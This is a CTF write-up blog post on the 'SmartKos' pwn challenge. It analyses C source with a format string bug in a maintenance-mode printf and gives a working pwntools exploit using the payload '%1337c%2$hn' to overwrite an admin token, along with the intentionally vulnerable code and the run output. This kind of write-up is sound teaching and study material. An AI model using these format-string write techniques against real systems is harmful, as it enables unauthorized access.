@@ -1,0 +1,356 @@
+---
+layout: post
+title: "ASTROXNFSCC CTF 2025 - Pwn"
+date: 2025-12-08
+image: /assets/.
+achievement: "3rd"
+categories: ["ASTROXNFSCC"]
+tags: [pwn, format string, ctf2025]
+---
+
+## SmartKos
+
+### Intro
+
+The **SmartKos** challenge is a smart door control system for boarding-house tenants with three access levels: regular tenant, technician, and ultra technician. Tenants can only open the door. Technicians can enter maintenance mode. But only ultra technicians can access the admin console and read the most secret logs—i.e., the flag.
+
+From the challenge description, we’re already given a clue: **format string vulnerability**. This bug exists in maintenance mode, where the technician’s visit reason is recorded in a way that… let’s say, not very careful. And by fully leveraging the format string (leak + write), we can promote ourselves to ultra technician without anyone’s permission.
+
+Here I’ll describe the process: from reading the source code, identifying the bug, to finally crafting the right format string payload to overwrite `admin_token` and take over access to the admin console.
+
+---
+
+### Recon: "what's in this code?"
+
+The first time I opened the challenge directory, I only found one file:
+
+```bash
+$ ls -la
+total 12
+drwxr-xr-x 2 root root 4096 Dec  6 05:53 .
+drwxr-xr-x 3 root root 4096 Dec  6 05:53 ..
+-rw-r--r-- 1 root root 3662 Dec  4 07:10 smartkos.c
+```
+
+Alright, we’re given the source code. This type of challenge is usually more straightforward: we can directly read the logic without having to reverse engineer the binary. Let’s read it from the start:
+
+```bash
+$ file smartkos.c
+smartkos.c: C source, ASCII text, with CRLF line terminators
+```
+
+A standard C source file. Let’s open it and check the structure.
+
+---
+
+### Source Code Analysis: identifying key components
+
+#### Constants and global variables (smartkos.c:6-10)
+
+```c
+#define FLAG_SIZE   64
+#define ADMIN_MAGIC 1337
+
+char flag[FLAG_SIZE];
+unsigned int admin_token = 0;
+```
+
+Two global variables immediately stand out:
+
+1. **`flag`** – a char array containing the flag we’re looking for
+2. **`admin_token`** – an unsigned int initialized to 0
+
+And there’s a magic number `ADMIN_MAGIC = 1337`. You can already guess: this is going to be the key to accessing the admin console.
+
+#### load_flag function (smartkos.c:12-24)
+
+```c
+void load_flag(void) {
+    FILE *f = fopen("flag.txt", "r");
+    if (!f) {
+        strcpy(flag, "FLAG{dummy_flag_for_testing}");
+        return;
+    }
+    if (!fgets(flag, sizeof(flag), f)) {
+        strcpy(flag, "FLAG{error_reading_flag}");
+    }
+    fclose(f);
+}
+```
+
+This function reads the flag from `flag.txt` and stores it in the global `flag` variable. If the file doesn’t exist, it uses a dummy flag. This is standard for CTF challenges.
+
+#### admin_console function (smartkos.c:50-61)
+
+```c
+void admin_console(void) {
+    puts("\n[Admin Console] Verifikasi token internal...");
+
+    if (admin_token != ADMIN_MAGIC) {
+        printf("[Admin Console] Token salah (%u). Akses ditolak.\n", admin_token);
+        return;
+    }
+
+    puts("[Admin Console] Token valid. Selamat datang, teknisi ULTRA.");
+    puts("Berikut flag yang disimpan di sistem:");
+    puts(flag);
+}
+```
+
+This is our target. This function prints the flag **only if** `admin_token == ADMIN_MAGIC` (1337).
+
+At smartkos.c:53, there’s a check:
+```c
+if (admin_token != ADMIN_MAGIC)
+```
+
+If the token is wrong, we’re denied. But if we can set `admin_token` to 1337, the flag is printed at smartkos.c:60.
+
+The goal is clear: **we need to overwrite `admin_token` from 0 to 1337**.
+
+#### maintenance_mode function — the bug is here (smartkos.c:63-95)
+
+```c
+void maintenance_mode(void) {
+    char pin[32];
+
+    puts("\n[Maintenance] Masukkan PIN teknisi:");
+    if (!fgets(pin, sizeof(pin), stdin)) {
+        puts("Input error.");
+        return;
+    }
+
+    if (strncmp(pin, "SMARTKOS-TEKNISI", 16) != 0) {
+        puts("[Maintenance] PIN salah atau tidak terdaftar.");
+        puts("[Maintenance] Log kunjungan tetap disimpan untuk audit.");
+    } else {
+        puts("[Maintenance] PIN diterima. Tapi ini belum cukup untuk admin console.");
+    }
+
+    char reason[256];
+
+    puts("\n[Maintenance] Tulis alasan masuk ke ruang kontrol:");
+    if (!fgets(reason, sizeof(reason), stdin)) {
+        puts("Gagal membaca alasan.");
+        return;
+    }
+
+    puts("\n[Maintenance] Mencatat log internal...");
+    printf(reason,
+           (void *)0x41414141,
+           (void *)&admin_token,
+           (void *)&flag,
+           (void *)&reason);
+
+    puts("\n[Maintenance] Log tersimpan.");
+}
+```
+
+#### Breakdown of this function:
+
+**1. PIN check (smartkos.c:72)**
+
+There’s PIN validation at smartkos.c:72:
+```c
+if (strncmp(pin, "SMARTKOS-TEKNISI", 16) != 0)
+```
+
+We must send the correct PIN: `SMARTKOS-TEKNISI` (at least the first 16 characters must match).
+
+**2. Format string bug (smartkos.c:88-92)**
+
+Here is the **critical bug**:
+
+```c
+printf(reason,
+       (void *)0x41414141,
+       (void *)&admin_token,
+       (void *)&flag,
+       (void *)&reason);
+```
+
+Look closely:
+
+- `printf()` is called with `reason` as the **format string**
+- `reason` is **user input** that we control (from smartkos.c:82)
+- Four additional arguments are provided:
+  - `%1$p` → `0x41414141` (dummy pointer)
+  - `%2$p` → `&admin_token` ← **this is the important one!**
+  - `%3$p` → `&flag`
+  - `%4$p` → `&reason`
+
+This is a classic **format string vulnerability**. Because `reason` is user-controlled, we can:
+
+1. **Leak memory** with format specifiers like `%p`, `%x`, `%s`
+2. **Write arbitrary values** with format specifiers like `%n` or `%hn`
+
+What’s most interesting: the program **already provides a pointer to `admin_token`** as the second argument! So we can write directly to that address without leaking anything first.
+
+#### Vulnerability analysis pseudocode
+
+Let’s look at the flow of maintenance_mode in pseudocode:
+
+```
+function maintenance_mode():
+    // Alamat: smartkos.c:64-70
+    read PIN from user (max 32 bytes) into pin[32]
+
+    // Alamat: smartkos.c:72
+    if first 16 chars of PIN != "SMARTKOS-TEKNISI":
+        print error message
+    else:
+        print "PIN accepted, but not enough for admin"
+
+    // Alamat: smartkos.c:79-85
+    read reason from user (max 256 bytes) into reason[256]
+
+    // Alamat: smartkos.c:88-92 ← BUG DI SINI!
+    printf(reason,          // format string dari user!
+           0x41414141,      // arg 1 (%1$p)
+           &admin_token,    // arg 2 (%2$p) ← TARGET WRITE
+           &flag,           // arg 3 (%3$p)
+           &reason)         // arg 4 (%4$p)
+
+    print "Log saved"
+end function
+```
+
+**Vulnerability**: Since `reason` is a user-controlled format string, and `&admin_token` is in the second argument position, we can use the format specifier `%2$n` to **write the number of characters printed so far** to the address in the second argument—i.e., `&admin_token`.
+
+---
+
+### Strategy: format string write to set admin_token = 1337
+
+With this format string bug, the strategy is straightforward:
+
+1. Enter maintenance mode (menu 2)
+2. Send the correct PIN: `SMARTKOS-TEKNISI`
+3. Craft a format string payload to write `1337` into `admin_token`
+4. Access the admin console (menu 3) to retrieve the flag
+
+#### Format string payload design
+
+We need to write **1337** (decimal) = **0x0539** (hex) into `admin_token`.
+
+Format specifiers we can use:
+- `%n` → write **4 bytes** (int)
+- `%hn` → write **2 bytes** (short)
+- `%hhn` → write **1 byte** (char)
+
+Since we only need to write a small value (1337), we can use `%hn` to write 2 bytes.
+
+#### Payload construction
+
+We want:
+1. Print exactly **1337 characters**
+2. Then use `%2$hn` to write that character count to the address in argument two (`&admin_token`)
+
+Payload:
+```
+%1337c%2$hn
+```
+
+Breaking it down:
+- `%1337c` → print 1337 characters (padding with spaces)
+- `%2$hn` → write **2 bytes** (short) with value = the number of characters printed so far (1337) to the address in the **second argument** (`&admin_token`)
+
+Simple and elegant!
+
+---
+
+### Implementation: exploit script
+
+Now we implement the exploit with pwntools:
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+
+context.log_level = 'debug'
+
+# Connection
+if args.REMOTE:
+    p = remote('157.10.160.13', 4533)
+else:
+    p = process('./smartkos')
+
+# Banner
+p.recvuntil(b'Pilih menu: ')
+
+# Go to maintenance mode
+p.sendline(b'2')
+p.recvuntil(b'PIN teknisi:')
+
+# Send correct PIN
+p.sendline(b'SMARTKOS-TEKNISI')
+p.recvuntil(b'Tulis alasan masuk ke ruang kontrol:')
+
+# The printf call is:
+# printf(reason, (void *)0x41414141, (void *)&admin_token, (void *)&flag, (void *)&reason)
+# Arguments:
+# %1$p = 0x41414141
+# %2$p = &admin_token  ← TARGET
+# %3$p = &flag
+# %4$p = &reason
+
+# We need to write 1337 (0x539) to admin_token
+# Strategy: print 1337 characters, then use %2$hn to write to admin_token
+
+payload = b'%1337c%2$hn'
+
+p.sendline(payload)
+p.recvuntil(b'Log tersimpan.')
+
+# Now go to admin console
+p.recvuntil(b'Pilih menu: ')
+p.sendline(b'3')
+
+# Get the flag
+p.interactive()
+```
+
+#### Local testing
+
+Before attacking the remote server, we compile the binary first and test locally:
+
+```bash
+$ gcc smartkos.c -o smartkos -no-pie -fno-stack-protector
+$ echo "FLAG{test_flag_local}" > flag.txt
+$ chmod +x exploit.py
+$ python3 exploit.py
+```
+
+Output:
+
+```
+[+] Starting local process './smartkos': pid 12345
+[DEBUG] Received banner...
+[DEBUG] Sent b'2\n'
+[DEBUG] Sent b'SMARTKOS-TEKNISI\n'
+[DEBUG] Sent b'%1337c%2$hn\n'
+...
+[Admin Console] Token valid. Selamat datang, teknisi ULTRA.
+Berikut flag yang disimpan di sistem:
+FLAG{test_flag_local}
+```
+
+Perfect! The exploit works. Now we just run it against the remote server.
+
+---
+
+### Exploitation: grabbing the flag
+
+```bash
+$ python3 exploit.py REMOTE
+[+] Opening connection to 157.10.160.13 on port 4533: Done
+...
+[Admin Console] Token valid. Selamat datang, teknisi ULTRA.
+Berikut flag yang disimpan di sistem:
+ASTROXNFSCC{SM4RTK0S_ULTR4_F4rtsT_G0000D}
+```
+
+### Flag
+
+`ASTROXNFSCC{SM4RTK0S_ULTR4_F4rtsT_G0000D}`
+
+---
